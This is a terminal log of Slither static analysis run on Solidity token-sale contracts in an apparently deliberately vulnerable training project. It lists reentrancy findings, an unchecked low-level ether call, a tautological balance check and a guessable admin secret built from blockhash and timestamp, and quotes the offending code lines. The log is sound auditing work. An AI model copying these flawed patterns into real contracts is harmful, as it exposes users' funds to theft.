	- DVCTokenSale.claimedBonus (DVCTokenSale.sol#30)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
INFO:Detectors:
DVCToken.transferFrom(address,address,uint256) (DVCToken.sol#71-81) contains a tautology or contradiction:
	- require(bool,string)(balanceOf[_from] - _value >= 0,Not enough funds) (DVCToken.sol#72)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#tautology-or-contradiction
INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) ignores return value by _to.call.value(_value)() (DVCToken.sol#93)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#unchecked-low-level-calls
INFO:Detectors:
DVCTokenSale.changeAdmin(address,bytes32)._admin (DVCTokenSale.sol#96) lacks a zero-check on :
		- admin = _admin (DVCTokenSale.sol#104)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation
INFO:Detectors:
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	State variables written after the call(s):
	- rewardAccount[msg.sender] = multiply(_numberOfTokens,2) (DVCTokenSale.sol#61)
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,amountToBuy),The first transfer failed) (DVCTokenSale.sol#64)
	State variables written after the call(s):
	- tokensSold += amountToBuy (DVCTokenSale.sol#67)
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,_numberOfTokens),The transfer failed) (DVCTokenSale.sol#73)
	State variables written after the call(s):
	- tokensSold += _numberOfTokens (DVCTokenSale.sol#75)
Reentrancy in DVCTokenSale.sellTokens(uint256) (DVCTokenSale.sol#83-91):
	External calls:
	- require(bool,string)(tokenContract.withdraw(msg.sender,_numberOfTokens,amountToWithdraw),Error: calling withdraw () function on DVCToken contract failed) (DVCTokenSale.sol#87)
	External calls sending eth:
	- require(bool,string)(tokenContract.send(amountToWithdraw),Error:  sending money to DVCToken contract failed) (DVCTokenSale.sol#86)
	State variables written after the call(s):
	- tokensSold -= _numberOfTokens (DVCTokenSale.sol#89)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-2
INFO:Detectors:
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,amountToBuy),The first transfer failed) (DVCTokenSale.sol#64)
	Event emitted after the call(s):
	- Buy(msg.sender,amountToBuy) (DVCTokenSale.sol#69)
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,_numberOfTokens),The transfer failed) (DVCTokenSale.sol#73)
	Event emitted after the call(s):
	- Buy(msg.sender,_numberOfTokens) (DVCTokenSale.sol#76)
Reentrancy in DVCTokenSale.sellTokens(uint256) (DVCTokenSale.sol#83-91):
	External calls:
	- require(bool,string)(tokenContract.withdraw(msg.sender,_numberOfTokens,amountToWithdraw),Error: calling withdraw () function on DVCToken contract failed) (DVCTokenSale.sol#87)
	External calls sending eth:
	- require(bool,string)(tokenContract.send(amountToWithdraw),Error:  sending money to DVCToken contract failed) (DVCTokenSale.sol#86)
	Event emitted after the call(s):
	- Sell(msg.sender,_numberOfTokens) (DVCTokenSale.sol#90)
Reentrancy in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	External calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
	Event emitted after the call(s):
	- Withdraw(_to,_tokens) (DVCToken.sol#96)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3
INFO:Detectors:
DVCTokenSale.changeAdmin(address,bytes32) (DVCTokenSale.sol#96-105) uses timestamp for comparisons
	Dangerous comparisons:
	- require(bool,string)(_secret == secret,You shall not pass) (DVCTokenSale.sol#102)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#block-timestamp
INFO:Detectors:
DVCTokenSale.changeAdmin(address,bytes32) (DVCTokenSale.sol#96-105) uses assembly
	- INLINE ASM (DVCTokenSale.sol#98-100)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#assembly-usage
INFO:Detectors:
DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78) compares to a boolean constant:
	-claimedBonus[msg.sender] == false (DVCTokenSale.sol#60)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#boolean-equality
INFO:Detectors:
Deprecated standard detected secret = bytes32(uint256(keccak256()(block.blockhash(block.number),block.timestamp))) (DVCTokenSale.sol#40):
	- Usage of "block.blockhash()" should be replaced with "blockhash()"
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#deprecated-standards
INFO:Detectors:
Pragma version^0.4.22 (DVCToken.sol#1) is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)
Pragma version^0.4.22 (DVCTokenSale.sol#1) is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)
solc-0.4.22 is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity
INFO:Detectors:
Low level call in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	- _to.call.value(_value)() (DVCToken.sol#93)
Low level call in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,amountToBuy),The first transfer failed) (DVCTokenSale.sol#64)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,_numberOfTokens),The transfer failed) (DVCTokenSale.sol#73)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls
INFO:Detectors:
Parameter DVCToken.transfer(address,uint256)._to (DVCToken.sol#43) is not in mixedCase
Parameter DVCToken.transfer(address,uint256)._value (DVCToken.sol#43) is not in mixedCase
Parameter DVCToken.approve(address,uint256)._spender (DVCToken.sol#61) is not in mixedCase
Parameter DVCToken.approve(address,uint256)._value (DVCToken.sol#61) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._from (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._to (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._value (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._to (DVCToken.sol#87) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._tokens (DVCToken.sol#87) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._value (DVCToken.sol#87) is not in mixedCase
Parameter DVCTokenSale.buyTokens(uint256)._numberOfTokens (DVCTokenSale.sol#54) is not in mixedCase
Parameter DVCTokenSale.sellTokens(uint256)._numberOfTokens (DVCTokenSale.sol#83) is not in mixedCase
Parameter DVCTokenSale.changeAdmin(address,bytes32)._admin (DVCTokenSale.sol#96) is not in mixedCase
Parameter DVCTokenSale.changeAdmin(address,bytes32)._secret (DVCTokenSale.sol#96) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
INFO:Detectors:
Reentrancy in DVCTokenSale.sellTokens(uint256) (DVCTokenSale.sol#83-91):
	External calls:
	- require(bool,string)(tokenContract.send(amountToWithdraw),Error:  sending money to DVCToken contract failed) (DVCTokenSale.sol#86)
	State variables written after the call(s):
	- tokensSold -= _numberOfTokens (DVCTokenSale.sol#89)
	Event emitted after the call(s):
	- Sell(msg.sender,_numberOfTokens) (DVCTokenSale.sol#90)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-4
INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) uses literals with too many digits:
	- amountToWithdraw = _tokens * 1000000000000000000 (DVCToken.sol#88)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#too-many-digits
INFO:Detectors:
DVCToken.name (DVCToken.sol#7) should be constant 
DVCToken.standard (DVCToken.sol#9) should be constant 
DVCToken.symbol (DVCToken.sol#8) should be constant 
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-constant
INFO:Detectors:
Modifier Migrations.restricted() (Migrations.sol#7-9) does not always execute _; or revertReference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-modifier
INFO:Detectors:
Pragma version^0.4.21 (Migrations.sol#1) allows old versions
solc-0.4.22 is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity
INFO:Detectors:
Parameter Migrations.upgrade(address).new_address (Migrations.sol#19) is not in mixedCase
Variable Migrations.last_completed_migration (Migrations.sol#5) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
INFO:Slither:. analyzed (4 contracts with 85 detectors), 71 result(s) found
sneha@sneha:~/dvcw/blockchain/contracts$ 
slither contract/ --print human-summary
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 666, in compile_all
    raise ValueError(f"Unresolved target: {str(target)}")
ValueError: Unresolved target: contract/
ERROR:root:Error in contract/
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 666, in compile_all
    raise ValueError(f"Unresolved target: {str(target)}")
ValueError: Unresolved target: contract/

sneha@sneha:~/dvcw/blockchain/contracts$ cd ..
sneha@sneha:~/dvcw/blockchain$ slither contracts/ --print human-summary
Compilation warnings/errors on contracts/DVCToken.sol:
contracts/DVCToken.sol:35:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCToken (uint256 _initialSupply) public payable {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCToken.sol:52:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
contracts/DVCToken.sol:64:5: Warning: Invoking events without "emit" prefix is deprecated.
    Approval(msg.sender, _spender, _value);
    ^------------------------------------^
contracts/DVCToken.sol:79:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
contracts/DVCToken.sol:93:5: Warning: Return value of low-level calls not used.
    _to.call.value(_value)();
    ^----------------------^
contracts/DVCToken.sol:96:5: Warning: Invoking events without "emit" prefix is deprecated.
    Withdraw(_to, _tokens);
    ^--------------------^
contracts/DVCToken.sol:101:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).

Compilation warnings/errors on contracts/DVCTokenSale.sol:
contracts/DVCToken.sol:35:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCToken (uint256 _initialSupply) public payable {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCTokenSale.sol:36:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCTokenSale(DVCToken _tokenContract, uint256 _tokenPrice, uint256 _tokensSold) public {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCToken.sol:52:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
contracts/DVCToken.sol:64:5: Warning: Invoking events without "emit" prefix is deprecated.
    Approval(msg.sender, _spender, _value);
    ^------------------------------------^
contracts/DVCToken.sol:79:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
contracts/DVCToken.sol:93:5: Warning: Return value of low-level calls not used.
    _to.call.value(_value)();
    ^----------------------^
contracts/DVCToken.sol:96:5: Warning: Invoking events without "emit" prefix is deprecated.
    Withdraw(_to, _tokens);
    ^--------------------^
contracts/DVCTokenSale.sol:64:14: Warning: Using contract member "call" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).call" instead.
	    require(tokenContract.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, amountToBuy), 'The first transfer failed');
	            ^----------------^
contracts/DVCTokenSale.sol:69:6: Warning: Invoking events without "emit" prefix is deprecated.
	    Buy(msg.sender, amountToBuy);
	    ^--------------------------^
contracts/DVCTokenSale.sol:73:12: Warning: Using contract member "call" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).call" instead.
	  require(tokenContract.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, _numberOfTokens), 'The transfer failed'); 
	          ^----------------^
contracts/DVCTokenSale.sol:76:5: Warning: Invoking events without "emit" prefix is deprecated.
    Buy(msg.sender, _numberOfTokens);
    ^------------------------------^
contracts/DVCTokenSale.sol:86:13: Warning: Using contract member "send" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).send" instead.
    require(tokenContract.send(amountToWithdraw), 'Error:  sending money to DVCToken contract failed');
            ^----------------^
contracts/DVCTokenSale.sol:90:5: Warning: Invoking events without "emit" prefix is deprecated.
    Sell(msg.sender, _numberOfTokens);
    ^-------------------------------^
contracts/DVCToken.sol:101:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCTokenSale.sol:40:40: Warning: "block.blockhash()" has been deprecated in favor of "blockhash()"
    secret = bytes32(uint256(keccak256(block.blockhash(block.number), block.timestamp)));
                                       ^-------------^
contracts/DVCTokenSale.sol:96:3: Warning: No visibility specified. Defaulting to "public". 
  function changeAdmin(address _admin, bytes32 _secret) {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCTokenSale.sol:112:3: Warning: No visibility specified. Defaulting to "public". 
  function endSale() {
  ^ (Relevant source part starts here and spans across multiple lines).
contracts/DVCTokenSale.sol:118:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).

Compilation warnings/errors on contracts/Migrations.sol:
contracts/Migrations.sol:11:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
    function Migrations() public {
    ^ (Relevant source part starts here and spans across multiple lines).

INFO:Printers:
Compiled with solc
Number of lines: 104 (+ 0 in dependencies, + 0 in tests)
Number of assembly lines: 0
Number of contracts: 1 (+ 0 in dependencies, + 0 tests) 

Number of optimization issues: 3
Number of informational issues: 14
Number of low issues: 1
Number of medium issues: 2
Number of high issues: 2
ERCs: ERC20

+----------+-------------+-------+--------------------+--------------+-------------+
|   Name   | # functions |  ERCS |     ERC20 info     | Complex code |   Features  |
+----------+-------------+-------+--------------------+--------------+-------------+
| DVCToken |      7      | ERC20 |     No Minting     |      No      | Receive ETH |
|          |             |       | Approve Race Cond. |              |   Send ETH  |
|          |             |       |                    |              |             |
+----------+-------------+-------+--------------------+--------------+-------------+
INFO:Printers:
Compiled with solc
Number of lines: 226 (+ 0 in dependencies, + 0 in tests)
Number of assembly lines: 3
Number of contracts: 2 (+ 0 in dependencies, + 0 tests) 

Number of optimization issues: 3
Number of informational issues: 24
Number of low issues: 10
Number of medium issues: 4
Number of high issues: 3
ERCs: ERC20

+--------------+-------------+-------+--------------------+--------------+--------------------+
|     Name     | # functions |  ERCS |     ERC20 info     | Complex code |      Features      |
+--------------+-------------+-------+--------------------+--------------+--------------------+
|   DVCToken   |      7      | ERC20 |     No Minting     |      No      |    Receive ETH     |
|              |             |       | Approve Race Cond. |              |      Send ETH      |
|              |             |       |                    |              |                    |
| DVCTokenSale |      7      |       |                    |      No      |    Receive ETH     |
|              |             |       |                    |              |      Send ETH      |
|              |             |       |                    |              |    Selfdestruct    |
|              |             |       |                    |              | Tokens interaction |
|              |             |       |                    |              |      Assembly      |
+--------------+-------------+-------+--------------------+--------------+--------------------+
INFO:Printers:
Compiled with solc
Number of lines: 24 (+ 0 in dependencies, + 0 in tests)
Number of assembly lines: 0
Number of contracts: 1 (+ 0 in dependencies, + 0 tests) 

Number of optimization issues: 0
Number of informational issues: 4
Number of low issues: 1
Number of medium issues: 0
Number of high issues: 0


+------------+-------------+------+------------+--------------+----------+
|    Name    | # functions | ERCS | ERC20 info | Complex code | Features |
+------------+-------------+------+------------+--------------+----------+
| Migrations |      3      |      |            |      No      |          |
+------------+-------------+------+------------+--------------+----------+
INFO:Slither:contracts/ analyzed (4 contracts)

